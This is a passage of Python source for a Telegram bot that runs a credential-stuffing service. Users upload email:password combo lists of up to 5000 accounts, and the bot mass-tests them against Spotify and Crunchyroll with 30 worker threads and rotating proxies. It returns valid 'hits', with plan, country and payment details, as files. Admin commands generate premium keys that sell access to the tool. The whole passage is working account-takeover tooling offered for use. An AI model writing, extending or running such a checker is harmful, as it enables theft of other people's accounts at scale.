    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for result in results:
        checked_count[0] += 1
        if isinstance(result, Exception):
            fails.append(f"ERROR:Unknown")
        elif result[0] == 'hit':
            hits.append(result[1])
            if result[2]:
                hits_detailed.append(result[2])
        else:
            fails.append(result[1])
    
    executor.shutdown(wait=False)
    progress_task.cancel()
    
    stats_msg = "╔═════════════════════════╗\n"
    stats_msg += "   🎵 𝗦𝗣𝗢𝗧𝗜𝗙𝗬 𝗥𝗘𝗦𝗨𝗟𝗧𝗦\n"
    stats_msg += "╚═════════════════════════╝\n\n"
    stats_msg += f"✅ Hits: {len(hits)}\n"
    stats_msg += f"❌ Fails: {len(fails)}\n"
    stats_msg += f"📊 Total: {len(accounts)}\n"
    stats_msg += "━━━━━━━━━━━━━━━━━━━━━━━\n"
    
    if hits:
        stats_msg += "\n📋 HITS:\n"
        for hit in hits_detailed[:10]:
            stats_msg += f"✅ {hit}\n"
        if len(hits) > 10:
            stats_msg += f"\n... and {len(hits) - 10} more hits!"
    
    await msg.edit_text(stats_msg)
    
    if hits and len(hits) > 10:
        hits_file = '\n'.join(hits_detailed)
        from io import BytesIO
        file_obj = BytesIO(hits_file.encode('utf-8'))
        file_obj.name = 'spotify_hits.txt'
        await update.message.reply_document(document=file_obj, caption=f"📋 All {len(hits)} Spotify hits!")

async def cancel_spotify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Spotify mass check cancelled!")
    context.user_data.clear()
    return ConversationHandler.END

async def set_spotify_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "╔═════════════════════════╗\n"
            "   🔧 𝗦𝗣𝗢𝗧𝗜𝗙𝗬 𝗣𝗥𝗢𝗫𝗬\n"
            "╚═════════════════════════╝\n\n"
            "❌ Usage: /psp proxy\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Formats supported:\n"
            "• ip:port\n"
            "• ip:port:user:pass\n"
            "• http://ip:port\n"
            "• socks5://ip:port\n"
            "• socks5://user:pass@ip:port\n"
            "━━━━━━━━━━━━━━━━━━━━━━━"
        )
        return
    
    proxy = ' '.join(context.args)
    SPOTIFY_GLOBAL_SETTINGS['proxy'] = proxy
    
    await update.message.reply_text(
        "╔═════════════════════════╗\n"
        "   ✅ 𝗣𝗥𝗢𝗫𝗬 𝗦𝗘𝗧\n"
        "╚═════════════════════════╝\n\n"
        f"🔧 Spotify Proxy: {proxy}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "All Spotify checks will use this proxy!"
    )

async def remove_spotify_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    SPOTIFY_GLOBAL_SETTINGS['proxy'] = None
    
    await update.message.reply_text(
        "╔═════════════════════════╗\n"
        "   ✅ 𝗣𝗥𝗢𝗫𝗬 𝗥𝗘𝗠𝗢𝗩𝗘𝗗\n"
        "╚═════════════════════════╝\n\n"
        "🔧 Spotify proxy removed!\n"
        "━━━━━━━━━━━━━━━━━━━━━━━"
    )

async def check_crunchyroll_api_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "╔═════════════════════════╗\n"
            "   🍥 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 𝗔𝗣𝗜\n"
            "╚═════════════════════════╝\n\n"
            "❌ Usage: /ca email:password\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Example: /ca test@gmail.com:pass123"
        )
        return
    
    account = ' '.join(context.args)
    
    if ':' in account:
        email, password = account.split(':', 1)
    elif '|' in account:
        email, password = account.split('|', 1)
    else:
        await update.message.reply_text("❌ Invalid format! Use email:password")
        return
    
    email = email.strip()
    password = password.strip()
    
    start_time = time.time()
    
    msg = await update.message.reply_text(
        "み ¡@𝐓𝐎𝐣𝐢𝐂𝐇𝐊𝐁𝐨𝐭 ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩\n"
        "𝐂𝐑𝐔𝐍𝐂𝐇𝐘𝐑𝐎𝐋𝐋\n"
        "━━━━━━━━━\n"
        f"𝐀𝐂𝐂 ➜ {email[:3]}***\n"
        "𝐒𝐓𝐀𝐓𝐔𝐒 ➜ Checking...\n"
        "━━━━━━━━━"
    )
    
    try:
        proxy = CR_API_GLOBAL_SETTINGS.get('proxy')
        
        if proxy:
            cr_api_module.USE_PROXY = True
            cr_api_module.proxies_list = [proxy]
        else:
            cr_api_module.USE_PROXY = False
            cr_api_module.proxies_list = []
        
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, lambda: cr_api_check_account(email, password, silent=True))
        
        elapsed = round(time.time() - start_time, 2)
        proxy_status = "Yes" if proxy else "No"
        
        status = result.get('status', 'error')
        message = result.get('message', 'Unknown')
        captures = result.get('captures', {})
        
        if status == 'premium':
            plan = captures.get('Plan', 'Premium')
            remaining = captures.get('RemainingDays', 'N/A')
            country = captures.get('Country', 'N/A')
            payment = captures.get('PaymentMethod', 'N/A')
            
            response = (
                "み ¡@𝐓𝐎𝐣𝐢𝐂𝐇𝐊𝐁𝐨𝐭 ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩\n"
                "𝐂𝐑𝐔𝐍𝐂𝐇𝐘𝐑𝐎𝐋𝐋\n"
                "━━━━━━━━━\n"
                f"𝐀𝐂𝐂 ➜ {email}:{password}\n"
                f"𝐒𝐓𝐀𝐓𝐔𝐒 ➜ ✅ PREMIUM HIT\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {plan} | {remaining} | {country}\n"
                "━━━━━━━━━\n"
                f"𝗧/𝘁 : {elapsed}s | 𝐏𝐫𝐨𝐱𝐲 : {proxy_status}\n"
                f"𝐑𝐄𝐐 : @{update.effective_user.username or 'N/A'}\n"
                "𝐃𝐄𝐕 : @MUMIRU"
            )
        elif status == 'free':
            response = (
                "み ¡@𝐓𝐎𝐣𝐢𝐂𝐇𝐊𝐁𝐨𝐭 ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩\n"
                "𝐂𝐑𝐔𝐍𝐂𝐇𝐘𝐑𝐎𝐋𝐋\n"
                "━━━━━━━━━\n"
                f"𝐀𝐂𝐂 ➜ {email}:{password}\n"
                f"𝐒𝐓𝐀𝐓𝐔𝐒 ➜ ⚠️ FREE ACCOUNT\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ Valid but Free tier\n"
                "━━━━━━━━━\n"
                f"𝗧/𝘁 : {elapsed}s | 𝐏𝐫𝐨𝐱𝐲 : {proxy_status}\n"
                f"𝐑𝐄𝐐 : @{update.effective_user.username or 'N/A'}\n"
                "𝐃𝐄𝐕 : @MUMIRU"
            )
        elif status == 'expired':
            response = (
                "み ¡@𝐓𝐎𝐣𝐢𝐂𝐇𝐊𝐁𝐨𝐭 ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩\n"
                "𝐂𝐑𝐔𝐍𝐂𝐇𝐘𝐑𝐎𝐋𝐋\n"
                "━━━━━━━━━\n"
                f"𝐀𝐂𝐂 ➜ {email}:{password}\n"
                f"𝐒𝐓𝐀𝐓𝐔𝐒 ➜ ⚠️ EXPIRED PREMIUM\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ Previously Premium\n"
                "━━━━━━━━━\n"
                f"𝗧/𝘁 : {elapsed}s | 𝐏𝐫𝐨𝐱𝐲 : {proxy_status}\n"
                f"𝐑𝐄𝐐 : @{update.effective_user.username or 'N/A'}\n"
                "𝐃𝐄𝐕 : @MUMIRU"
            )
        else:
            response = (
                "み ¡@𝐓𝐎𝐣𝐢𝐂𝐇𝐊𝐁𝐨𝐭 ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩\n"
                "𝐂𝐑𝐔𝐍𝐂𝐇𝐘𝐑𝐎𝐋𝐋\n"
                "━━━━━━━━━\n"
                f"𝐀𝐂𝐂 ➜ {email}\n"
                f"𝐒𝐓𝐀𝐓𝐔𝐒 ➜ ❌ {status.upper()}\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {message}\n"
                "━━━━━━━━━\n"
                f"𝗧/𝘁 : {elapsed}s | 𝐏𝐫𝐨𝐱𝐲 : {proxy_status}\n"
                f"𝐑𝐄𝐐 : @{update.effective_user.username or 'N/A'}\n"
                "𝐃𝐄𝐕 : @MUMIRU"
            )
        
        await msg.edit_text(response)
        
    except Exception as e:
        await msg.edit_text(f"❌ Error checking Crunchyroll: {str(e)}")

async def check_crunchyroll_api_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_registered(user_id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return CR_API_WAITING_ACCOUNTS
    
    message_text = update.message.text or ""
    lines = message_text.replace('/mca', '').strip().split('\n')
    accounts = [line.strip() for line in lines if line.strip() and (':' in line or '|' in line)]
    
    if accounts:
        context.user_data['cr_api_accounts'] = accounts
        await process_crunchyroll_api_accounts(update, context)
        return ConversationHandler.END
    
    await update.message.reply_text(
        "╔═════════════════════════╗\n"
        "   🍥 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 𝗔𝗣𝗜\n"
        "╚═════════════════════════╝\n\n"
        "📝 Send accounts to check:\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Format:\n"
        "email:password\n"
        "email:password\n\n"
        "Or send a .txt file!\n"
        "Max: 5000 accounts"
    )
    return CR_API_WAITING_ACCOUNTS

async def receive_crunchyroll_api_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not update.message:
        await update.effective_chat.send_message("❌ Invalid message!")
        return CR_API_WAITING_ACCOUNTS
    
    if update.message.document:
        try:
            file = await context.bot.get_file(update.message.document.file_id)
            file_content = await file.download_as_bytearray()
            accounts_text = file_content.decode('utf-8', errors='ignore')
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading file: {str(e)}")
            return CR_API_WAITING_ACCOUNTS
    elif update.message.text:
        accounts_text = update.message.text
    else:
        await update.message.reply_text("❌ Please send text or a file!")
        return CR_API_WAITING_ACCOUNTS
    
    accounts = []
    for line in accounts_text.split('\n'):
        line = line.strip()
        if line and (':' in line or '|' in line):
            accounts.append(line)
    
    if not accounts:
        await update.message.reply_text("❌ No valid accounts found! Format: email:password")
        return CR_API_WAITING_ACCOUNTS
    
    if len(accounts) > 5000 and not is_admin(user_id):
        await update.message.reply_text("❌ Max 5000 accounts! Admins have no limit.")
        return CR_API_WAITING_ACCOUNTS
    
    context.user_data['cr_api_accounts'] = accounts
    await process_crunchyroll_api_accounts(update, context)
    return ConversationHandler.END

async def process_crunchyroll_api_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    accounts = context.user_data.get('cr_api_accounts', [])
    
    if not accounts:
        await update.message.reply_text("❌ No accounts provided!")
        return
    
    proxy = CR_API_GLOBAL_SETTINGS.get('proxy')
    proxy_status = "Yes" if proxy else "No"
    
    if proxy:
        cr_api_module.USE_PROXY = True
        cr_api_module.proxies_list = [proxy]
    else:
        cr_api_module.USE_PROXY = False
        cr_api_module.proxies_list = []
    
    msg = await update.message.reply_text(
        "╔═════════════════════════════════╗\n"
        "   🍥 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 𝗔𝗣𝗜 𝗠𝗔𝗦𝗦 𝗖𝗛𝗞\n"
        "╚═════════════════════════════════╝\n\n"
        f"📊 Total: {len(accounts)}\n"
        f"⚡ Workers: 30\n"
        f"🔄 Progress: 0/{len(accounts)}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "✅ Premium: 0\n"
        "⚠️ Free: 0\n"
        "❌ Failed: 0\n"
        f"🌐 Proxy: {proxy_status}"
    )
    
    premium_hits = []
    free_hits = []
    expired_hits = []
    fails = []
    checked_count = [0]
    
    import concurrent.futures
    
    def check_single(account):
        try:
            if ':' in account:
                email, password = account.split(':', 1)
            elif '|' in account:
                email, password = account.split('|', 1)
            else:
                return {'account': account, 'status': 'invalid'}
            
            email = email.strip()
            password = password.strip()
            
            result = cr_api_check_account(email, password, silent=True)
            return {
                'account': f"{email}:{password}",
                'email': email,
                'password': password,
                'result': result
            }
        except Exception as e:
            return {'account': account, 'status': 'error', 'message': str(e)}
    
    start_time = time.time()
    
    loop = asyncio.get_event_loop()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(check_single, acc): acc for acc in accounts}
        
        for future in concurrent.futures.as_completed(futures):
            try:
                data = future.result()
                checked_count[0] += 1
                
                if 'result' in data:
                    result = data['result']
                    status = result.get('status', 'error')
                    captures = result.get('captures', {})
                    
                    if status == 'premium':
                        plan = captures.get('Plan', 'Premium')
                        remaining = captures.get('RemainingDays', 'N/A')
                        country = captures.get('Country', 'N/A')
                        premium_hits.append(f"{data['account']} | {plan} | {remaining} | {country}")
                    elif status == 'free':
                        free_hits.append(data['account'])
                    elif status == 'expired':
                        expired_hits.append(data['account'])
                    else:
                        fails.append(data['account'])
                else:
                    fails.append(data['account'])
                
                if checked_count[0] % 30 == 0 or checked_count[0] == len(accounts):
                    try:
                        elapsed = round(time.time() - start_time, 1)
                        await msg.edit_text(
                            "╔═════════════════════════════════╗\n"
                            "   🍥 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 𝗔𝗣𝗜 𝗠𝗔𝗦𝗦 𝗖𝗛𝗞\n"
                            "╚═════════════════════════════════╝\n\n"
                            f"📊 Total: {len(accounts)}\n"
                            f"⚡ Workers: 30\n"
                            f"🔄 Progress: {checked_count[0]}/{len(accounts)}\n"
                            f"⏱️ Time: {elapsed}s\n"
                            "━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"✅ Premium: {len(premium_hits)}\n"
                            f"⚠️ Free: {len(free_hits)}\n"
                            f"📅 Expired: {len(expired_hits)}\n"
                            f"❌ Failed: {len(fails)}\n"
                            f"🌐 Proxy: {proxy_status}"
                        )
                    except:
                        pass
            except Exception:
                fails.append(futures[future])
    
    elapsed_total = round(time.time() - start_time, 2)
    
    final_msg = (
        "╔═════════════════════════════════╗\n"
        "   ✅ 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 𝗖𝗛𝗘𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘\n"
        "╚═════════════════════════════════╝\n\n"
        f"📊 Total Checked: {len(accounts)}\n"
        f"⏱️ Time Taken: {elapsed_total}s\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Premium Hits: {len(premium_hits)}\n"
        f"⚠️ Free Accounts: {len(free_hits)}\n"
        f"📅 Expired: {len(expired_hits)}\n"
        f"❌ Failed: {len(fails)}\n"
        f"🌐 Proxy: {proxy_status}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"𝐑𝐄𝐐 : @{update.effective_user.username or 'N/A'}\n"
        "𝐃𝐄𝐕 : @MUMIRU"
    )
    
    await msg.edit_text(final_msg)
    
    if premium_hits:
        from io import BytesIO
        hits_content = '\n'.join(premium_hits)
        file_obj = BytesIO(hits_content.encode())
        file_obj.name = 'crunchyroll_premium_hits.txt'
        await update.message.reply_document(
            document=file_obj,
            caption=f"✅ {len(premium_hits)} PREMIUM CRUNCHYROLL HITS!"
        )
    
    if free_hits:
        from io import BytesIO
        free_content = '\n'.join(free_hits)
        file_obj = BytesIO(free_content.encode())
        file_obj.name = 'crunchyroll_free.txt'
        await update.message.reply_document(
            document=file_obj,
            caption=f"⚠️ {len(free_hits)} Free Accounts"
        )

async def cancel_crunchyroll_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Crunchyroll API mass check cancelled!")
    context.user_data.clear()
    return ConversationHandler.END

async def set_crunchyroll_api_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if not context.args:
        current = CR_API_GLOBAL_SETTINGS.get('proxy') or "None"
        await update.message.reply_text(
            "╔═════════════════════════╗\n"
            "   🍥 𝗖𝗥𝗨𝗡𝗖𝗛𝗬 𝗣𝗥𝗢𝗫𝗬\n"
            "╚═════════════════════════╝\n\n"
            f"🌐 Current: {current}\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Usage: /pca proxy\n\n"
            "Formats:\n"
            "• ip:port\n"
            "• ip:port:user:pass\n"
            "• http://ip:port\n"
            "• socks5://user:pass@ip:port"
        )
        return
    
    proxy = ' '.join(context.args)
    CR_API_GLOBAL_SETTINGS['proxy'] = proxy
    
    await update.message.reply_text(
        "╔═════════════════════════╗\n"
        "   ✅ 𝗣𝗥𝗢𝗫𝗬 𝗦𝗘𝗧\n"
        "╚═════════════════════════╝\n\n"
        f"🌐 Crunchyroll API Proxy: {proxy}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "All /ca and /mca checks will use this proxy!"
    )

async def remove_crunchyroll_api_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    CR_API_GLOBAL_SETTINGS['proxy'] = None
    
    await update.message.reply_text(
        "╔═════════════════════════╗\n"
        "   ✅ 𝗣𝗥𝗢𝗫𝗬 𝗥𝗘𝗠𝗢𝗩𝗘𝗗\n"
        "╚═════════════════════════╝\n\n"
        "🌐 Crunchyroll API proxy removed!\n"
        "━━━━━━━━━━━━━━━━━━━━━━━"
    )

async def receive_crunchyroll_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not update.message:
        await update.effective_chat.send_message("❌ Invalid message!")
        return CR_WAITING_ACCOUNTS
    
    if update.message.document:
        try:
            file = await context.bot.get_file(update.message.document.file_id)
            file_content = await file.download_as_bytearray()
            accounts_text = file_content.decode('utf-8', errors='ignore')
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading file: {str(e)}")
            return CR_WAITING_ACCOUNTS
    elif update.message.text:
        accounts_text = update.message.text
    else:
        await update.message.reply_text("❌ Please send text or a file!")
        return CR_WAITING_ACCOUNTS
    
    accounts = []
    for line in accounts_text.split('\n'):
        line = line.strip()
        if line and (':' in line or '|' in line):
            accounts.append(line)
        elif ',' in accounts_text:
            accounts = [acc.strip() for acc in accounts_text.split(',') if acc.strip()]
            break
    
    if not accounts:
        await update.message.reply_text("❌ No valid accounts found! Please send in format: email:password")
        return CR_WAITING_ACCOUNTS
    
    if len(accounts) > 5000 and not is_admin(user_id):
        await update.message.reply_text("❌ Max 5000 accounts for users! Admins have no limit.")
        return CR_WAITING_ACCOUNTS
    
    context.user_data['accounts'] = accounts
    await process_crunchyroll_accounts(update, context)
    return ConversationHandler.END

async def process_crunchyroll_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    accounts = context.user_data.get('accounts', [])
    
    if not accounts:
        await update.message.reply_text("❌ No accounts provided!")
        return
    
    hits = []
    hits_detailed = []
    fails = []
    msg = await update.message.reply_text(f"⏳ Checking 0/{len(accounts)} accounts...")
    
    checker = None
    try:
        checker = CrunchyrollChecker(use_proxy=False)
        await checker.get_session()
        
        for idx, account in enumerate(accounts, 1):
            try:
                if ':' in account:
                    email, password = account.split(':', 1)
                elif '|' in account:
                    email, password = account.split('|', 1)
                else:
                    fails.append(f"INVALID:{account}")
                    continue
                
                result = await checker.check_account(email.strip(), password.strip())
                
                if result.get('success'):
                    hit_line = f"{email}:{password}"
                    details = []
                    
                    if result.get('username'):
                        details.append(f"User={result['username']}")
                    if result.get('email'):
                        details.append(f"Email={result['email']}")
                    if result.get('subscription'):
                        details.append(f"Sub={result['subscription']}")
                    if result.get('country'):
                        details.append(f"Country={result['country']}")
                    
                    if details:
                        hit_line += f" | {' | '.join(details)}"
                    
                    hits.append(f"{email}:{password}")
                    hits_detailed.append(hit_line)
                else:
                    status = result.get('status', 'UNKNOWN')
                    fails.append(f"{status}:{email}:{password}")
                
                if idx % 10 == 0:
                    await msg.edit_text(f"⏳ Checking {idx}/{len(accounts)} accounts...\n✅ Hits: {len(hits)}\n❌ Fails: {len(fails)}")
            except Exception as e:
                fails.append(f"ERROR:{account}")
        
        stats_msg = "✅ 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘\n"
        stats_msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
        stats_msg += f"✅ Hits: {len(hits)}\n"
        stats_msg += f"❌ Fails: {len(fails)}\n"
        stats_msg += f"📊 Total: {len(accounts)}\n"
        stats_msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
        
        if hits:
            stats_msg += "\n📋 DETAILED HITS:\n"
            for idx, hit_detail in enumerate(hits_detailed[:5], 1):
                stats_msg += f"\n{idx}. {hit_detail}\n"
            if len(hits_detailed) > 5:
                stats_msg += f"\n... and {len(hits_detailed) - 5} more in the file"
        
        await msg.edit_text(stats_msg)
        
        if hits:
            hits_txt = '\n'.join(hits)
            await update.message.reply_document(
                document=hits_txt.encode(),
                filename=f"crunchyroll_hits_{user_id}.txt",
                caption="✅ VALID CRUNCHYROLL ACCOUNTS (Simple)"
            )
            
            hits_detailed_txt = '\n'.join(hits_detailed)
            await update.message.reply_document(
                document=hits_detailed_txt.encode(),
                filename=f"crunchyroll_hits_detailed_{user_id}.txt",
                caption="✅ VALID CRUNCHYROLL ACCOUNTS (Full Info)"
            )
        
        if fails:
            fails_txt = '\n'.join(fails)
            await update.message.reply_document(
                document=fails_txt.encode(),
                filename=f"crunchyroll_invalid_{user_id}.txt",
                caption="❌ INVALID/ERROR"
            )
    except Exception as e:
        await msg.edit_text(f"❌ Error: {str(e)}")
    finally:
        if checker:
            await checker.close_session()

async def cancel_crunchyroll(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Crunchyroll mass check cancelled!")
    context.user_data.clear()
    return ConversationHandler.END

async def set_ms_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if not context.args:
        current = MS_GLOBAL_SETTINGS['proxy'] or "None"
        await update.message.reply_text(f"🌐 Current Proxy: {current}\n\nUsage: /smp proxy_url")
        return
    
    proxy = ' '.join(context.args)
    MS_GLOBAL_SETTINGS['proxy'] = proxy
    await update.message.reply_text(f"✅ Proxy updated!\n🌐 {proxy}")

async def addgroup_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start /addgroup conversation"""
    if not is_admin(update.effective_user.id, update.effective_user.username):
        await update.message.reply_text("❌ Only admins can use this command!")
        return ConversationHandler.END
    
    await update.message.reply_text(
        "📝 **Add Authorized Group**\n\n"
        "Please send the group invite link:"
    )
    return WAITING_GROUP_LINK

async def receive_group_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive group link and ask for ID"""
    context.user_data['group_link'] = update.message.text
    
    await update.message.reply_text(
        "✅ Link received!\n\n"
        "Now please send the group ID (numeric):\n"
        "Example: -1001234567890"
    )
    return WAITING_GROUP_ID

async def receive_group_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive group ID and save"""
    try:
        group_id = int(update.message.text.strip())
        group_link = context.user_data.get('group_link', '')
        admin_username = update.effective_user.username or update.effective_user.first_name
        
        add_authorized_group(group_id, group_link, admin_username)
        
        await update.message.reply_text(
            "✅ **Group Added Successfully!**\n\n"
            f"🔗 Link: {group_link}\n"
            f"🆔 ID: {group_id}\n"
            f"👤 Added by: @{admin_username}\n\n"
            "Users can now use the bot in this group!"
        )
        
        context.user_data.clear()
        return ConversationHandler.END
        
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid group ID! Please send a numeric ID.\n"
            "Example: -1001234567890"
        )
        return WAITING_GROUP_ID

async def cancel_addgroup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel /addgroup conversation"""
    await update.message.reply_text("❌ Cancelled!")
    context.user_data.clear()
    return ConversationHandler.END

async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate premium keys - /key <quantity> <days>"""
    if not is_admin(update.effective_user.id, update.effective_user.username):
        await update.message.reply_text("❌ Only admins can use this command!")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "Usage: /key <quantity> <days>\n"
            "Example: /key 1 30"
        )
        return
    
    try:
        quantity = int(context.args[0])
        days = int(context.args[1])
        
        if quantity < 1 or days < 1:
            await update.message.reply_text("❌ Quantity and days must be positive numbers!")
            return
        
        admin_username = update.effective_user.username or update.effective_user.first_name
        
        keys_list = []
        for _ in range(quantity):
            key_code = generate_premium_key(1, days, admin_username)
            keys_list.append(key_code)
        
        keys_text = "\n".join([f"`{k}`" for k in keys_list])
        
        # Clean markdown characters from admin_username to prevent parse errors
        clean_admin = admin_username.replace('_', '\\_').replace('*', '\\*').replace('`', '\\`').replace('[', '\\[')
        
        await update.message.reply_text(
            f"🔑 **{quantity} Keys Created Successfully**\n\n"
            "———•————•—\n"
            f"{keys_text}\n"
            "—○——○——○——○—\n"
            f"📋 Quantity per key: 1\n"
            f"⌛ Expires In: {days} days\n"
            f"👤 Key Created By: @{clean_admin}\n"
            f"🎁 Created At: {datetime.now().strftime('%m/%d/%Y %I:%M %p')}\n\n"
            "☆🤔 How to redeem?\n\n"
            "🥂 Use: /redeem <key> to activate premium",
            parse_mode='Markdown'
        )
        
    except ValueError:
        await update.message.reply_text("❌ Please provide valid numbers for quantity and days!")

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast message to all users - /broadcast <message>"""
    if not is_admin(update.effective_user.id, update.effective_user.username):
        await update.message.reply_text("❌ Only admins can use this command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "   📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗖𝗢𝗠𝗠𝗔𝗡𝗗\n"
            "╚══════════════════════════╝\n\n"
            "📝 Usage:\n"
            "`/broadcast <your message>`\n\n"
            "Example:\n"
            "`/broadcast Hello everyone! Bot is updated.`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 This will send the message to all registered users."
        )
        return
    
    message = ' '.join(context.args)
    users = load_users()
    
    if not users:
        await update.message.reply_text("❌ No users registered yet!")
        return
    
    status_msg = await update.message.reply_text(
        f"📤 Broadcasting to {len(users)} users...\n⏳ Please wait..."
    )
    
    success_count = 0
    failed_count = 0
    
    broadcast_message = (
        "╔════════════════════════════╗\n"
        "   📢 𝗔𝗗𝗠𝗜𝗡 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧\n"
        "╚════════════════════════════╝\n\n"
        f"{message}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📅 {datetime.now().strftime('%m/%d/%Y %I:%M %p')}\n"
        f"👤 From: @{ADMIN_USERNAME}"
    )
    
    for user_id, user_data in users.items():
        try:
            await context.bot.send_message(
                chat_id=int(user_id),
                text=broadcast_message
            )
            success_count += 1
        except Exception as e:
            failed_count += 1
            logger.warning(f"Failed to send to {user_id}: {e}")
    
    await status_msg.edit_text(
        "╔════════════════════════════╗\n"
        "   ✅ 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘\n"
        "╚════════════════════════════╝\n\n"
        f"📊 Total Users: {len(users)}\n"
        f"✅ Success: {success_count}\n"
        f"❌ Failed: {failed_count}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📅 {datetime.now().strftime('%m/%d/%Y %I:%M %p')}"
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot statistics - /stats"""
    if not is_admin(update.effective_user.id, update.effective_user.username):
        await update.message.reply_text("❌ Only admins can use this command!")
        return
    
    users = load_users()
    authorized_groups = get_authorized_groups()
    
    from access_control import load_access_data
    access_data = load_access_data()
    premium_keys = access_data.get('premium_keys', {})
    premium_users = access_data.get('premium_users', {})
    
    total_keys = len(premium_keys)
    active_premium = len(premium_users)
    total_key_uses = sum(key.get('quantity', 0) - key.get('remaining_uses', 0) for key in premium_keys.values())
    
    stats_message = (
        "╔════════════════════════════╗\n"
        "   📊 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦\n"
        "╚════════════════════════════╝\n\n"
        "👥 𝗨𝘀𝗲𝗿𝘀:\n"
        f"├ Total Users: {len(users)}\n"
        f"├ Premium Users: {active_premium}\n"
        f"└ Regular Users: {len(users) - active_premium}\n\n"
        "🏢 𝗚𝗿𝗼𝘂𝗽𝘀:\n"
        f"└ Authorized Groups: {len(authorized_groups)}\n\n"
        "🔑 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗞𝗲𝘆𝘀:\n"
        f"├ Total Keys Created: {total_keys}\n"
        f"├ Total Redeemed: {total_key_uses}\n"
